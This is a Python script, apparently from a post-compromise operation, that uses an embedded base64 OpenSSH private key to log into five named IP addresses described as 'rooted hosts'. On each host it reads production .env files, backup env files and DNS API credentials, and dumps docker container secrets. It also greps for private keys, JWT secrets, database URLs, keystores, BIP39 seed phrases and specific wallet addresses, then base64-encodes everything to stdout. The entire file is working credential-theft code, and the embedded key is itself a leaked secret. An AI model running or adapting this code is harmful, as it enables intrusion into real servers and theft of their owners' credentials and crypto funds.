# -*- coding: utf-8 -*-
# intent 29489 round C: pull the exact high-value env files + docker env + targeted secret grep from the 5 rooted hosts.
import json,os,sys,base64,re,subprocess,time
from concurrent.futures import ThreadPoolExecutor
WORK="/tmp/p29489c"; os.makedirs(WORK,exist_ok=True)
KEYB64="LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFNd0FBQUF0emMyZ3RaVwpReU5UVXhPUUFBQUNBNU1vV0p5WHRrdFhLeERjVVpNeEl6R21VR0xxVDJ1cHlhVjVsS2VmU2wyZ0FBQUpCMjBlL3dkdEh2CjhBQUFBQXR6YzJndFpXUXlOVFV4T1FBQUFDQTVNb1dKeVh0a3RYS3hEY1VaTXhJekdtVUdMcVQydXB5YVY1bEtlZlNsMmcKQUFBRUN5alowOHYzU3J0bk1vMllGSG8raDI0dkNTY2RENmhqRVhNWmhmTG5hZGp6a3loWW5KZTJTMWNyRU54Umt6RWpNYQpaUVl1cFBhNm5KcFhtVXA1OUtYYUFBQUFDWFZpZFc1MGRVQm9hd0VDQXdRPQotLS0tLUVORCBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K"
open(WORK+"/fleetkey","wb").write(base64.b64decode(KEYB64)); os.chmod(WORK+"/fleetkey",0o600)
def R(k,v,maxb=60000):
    s=json.dumps(v,ensure_ascii=False) if not isinstance(v,str) else v
    if len(s)>maxb: s=s[:maxb]+"...TRUNC"
    sys.stdout.write("R:%s:%s\n"%(k,base64.b64encode(s.encode()).decode())); sys.stdout.flush()
def run(cmd,timeout=300):
    try:
        p=subprocess.run(cmd,capture_output=True,timeout=timeout); return p.returncode,p.stdout.decode("utf-8","replace"),p.stderr.decode("utf-8","replace")
    except Exception as e: return -1,"",repr(e)

CMDS={
"share-center":r'''
echo "@@@ENVPROD"; sudo cat /data/lumii-shared/app/.env.prod 2>/dev/null
echo "@@@CLOUDUSER"; sudo cat /data/lumii-shared/cloud-user.env 2>/dev/null
echo "@@@LS"; sudo ls -la /data/lumii-shared /data/lumii-shared/app 2>/dev/null | head -90
echo "@@@CFG"; sudo cat /etc/caddy/Caddyfile 2>/dev/null | head -80; echo "--dnspod.env"; sudo cat /etc/caddy/dnspod.env 2>/dev/null
echo "@@@GREP"; timeout 70 sudo grep -rlasE "zoofi|0xC56f7063fd6d199ccc443dbbf4283be602d46343|0xFE18Aa1EFa652660F36Ab84F122CD36108f903B6|JWT_SECRET|DATABASE_URL|BEGIN .*PRIVATE KEY|keystore|cipherparams|BIP39|postgres://" /data/lumii-shared 2>/dev/null | grep -vE "node_modules|\.git/" | head -70
echo "@@@DOCKER"; sudo docker ps --format "{{.Names}}|{{.Image}}" 2>/dev/null | head -20
echo "@@@END"''',
"prod-agent":r'''
echo "@@@RUNTIMEENV"; sudo cat /home/ubuntu/.lumii-runtime/home/runtime.env 2>/dev/null; echo "--ls"; sudo ls -la /home/ubuntu/.lumii-runtime/home 2>/dev/null
echo "@@@DOCKENV"; for c in $(sudo docker ps -q 2>/dev/null); do sudo docker inspect $c --format '{{.Name}}{{range .Config.Env}}|{{.}}{{end}}' 2>/dev/null | tr '|' '\n' | grep -aiE "zoofi|0xC56f|0xFE18|JWT|DATABASE|postgres|redis|SECRET|TOKEN|PRIVATE_KEY" | head -25; done
echo "@@@GREP"; timeout 70 sudo grep -rlasE "zoofi|0xC56f7063fd6d199ccc443dbbf4283be602d46343|0xFE18Aa1EFa652660F36Ab84F122CD36108f903B6|JWT_SECRET|DATABASE_URL|BEGIN .*PRIVATE KEY|keystore|cipherparams|BIP39" /home /opt/lumii-runtime /etc 2>/dev/null | grep -vE "node_modules|/pam" | head -70
echo "@@@END"''',
"LLM":r'''
echo "@@@ENVBW"; sudo cat /opt/src/lumii-bw-data/env-backup/.env.bw 2>/dev/null
echo "@@@LS"; sudo ls -la /opt/src 2>/dev/null; echo "--"; sudo ls -la /opt/src/lumii-bw-data /opt/src/lumii-bw-data/env-backup 2>/dev/null | head -40
echo "@@@GREP"; timeout 90 sudo grep -rlasE "zoofi|0xC56f7063fd6d199ccc443dbbf4283be602d46343|0xFE18Aa1EFa652660F36Ab84F122CD36108f903B6|keystore|cipherparams|scrypt|BIP39|JWT_SECRET|DATABASE_URL|postgres://|BEGIN .*PRIVATE KEY" /opt/src /home /opt/lumii 2>/dev/null | grep -vE "node_modules|\.git/" | head -90
echo "@@@END"''',
"golden-stage":r'''
echo "@@@ENVBAK"; sudo cat /opt/src/goldenyears-processor/.env.bak.20260630-160716 2>/dev/null; echo "--ls"; sudo ls -la /opt/src/goldenyears-processor 2>/dev/null | head -50
echo "@@@GREP"; timeout 80 sudo grep -rlasE "zoofi|0xC56f7063fd6d199ccc443dbbf4283be602d46343|0xFE18Aa1EFa652660F36Ab84F122CD36108f903B6|keystore|cipherparams|BIP39|JWT_SECRET|DATABASE_URL|postgres://|BEGIN .*PRIVATE KEY" /opt/src /home 2>/dev/null | grep -vE "node_modules|\.git/" | head -70
echo "@@@END"''',
"wu-ji-lian":r'''
echo "@@@ENV"; sudo cat /opt/lumii-wjl-docker/.env 2>/dev/null; echo "--dnspod"; sudo cat /etc/caddy/dnspod.env 2>/dev/null
echo "@@@LS"; sudo ls -la /opt /data 2>/dev/null | head -70
echo "@@@GREP"; timeout 80 sudo grep -rlasE "zoofi|0xC56f7063fd6d199ccc443dbbf4283be602d46343|0xFE18Aa1EFa652660F36Ab84F122CD36108f903B6|keystore|cipherparams|BIP39|JWT_SECRET|DATABASE_URL|postgres://|BEGIN .*PRIVATE KEY" /opt /home /etc /data 2>/dev/null | grep -vE "node_modules|\.git/|/pam" | head -70
echo "@@@END"''',
}
TARGETS=[("43.143.107.214","share-center"),("129.211.0.26","prod-agent"),("81.68.254.22","LLM"),("43.142.238.91","golden-stage"),("1.14.34.31","wu-ji-lian")]
def do(idx,host,label):
    cmd=CMDS[label]
    a=["ssh","-i",WORK+"/fleetkey","-o","BatchMode=yes","-o","StrictHostKeyChecking=no","-o","UserKnownHostsFile=/dev/null","-o","ConnectTimeout=10","-o","IdentitiesOnly=yes","ubuntu@%s"%host,cmd]
    rc,o,e=run(a,timeout=300)
    ok=("@@@ENV" in o or "@@@ENVPROD" in o or "@@@ENVBAK" in o or "@@@RUNTIMEENV" in o) and ("root" in o or "uid=" in o)
    R("t%d_%s_meta"%(idx,label),{"rc":rc,"ok":ok,"err":e[-160:],"outlen":len(o)})
    parts=re.split(r'@@@([A-Z0-9_]+)',o)
    for i in range(1,len(parts),2):
        R("t%d_%s"%(idx,parts[i].lower()),parts[i+1] if i+1<len(parts) else "",maxb=70000)
    return {"idx":idx,"host":host,"label":label,"rc":rc,"ok":ok}
RES=[]
try:
    with ThreadPoolExecutor(max_workers=5) as ex:
        for f in [ex.submit(do,i,h,l) for i,(h,l) in enumerate(TARGETS)]:
            try: RES.append(f.result())
            except Exception as e: R("exc",repr(e))
except Exception as e: R("top_exc",repr(e))
R("summary",RES); R("done",{"t":int(time.time())})
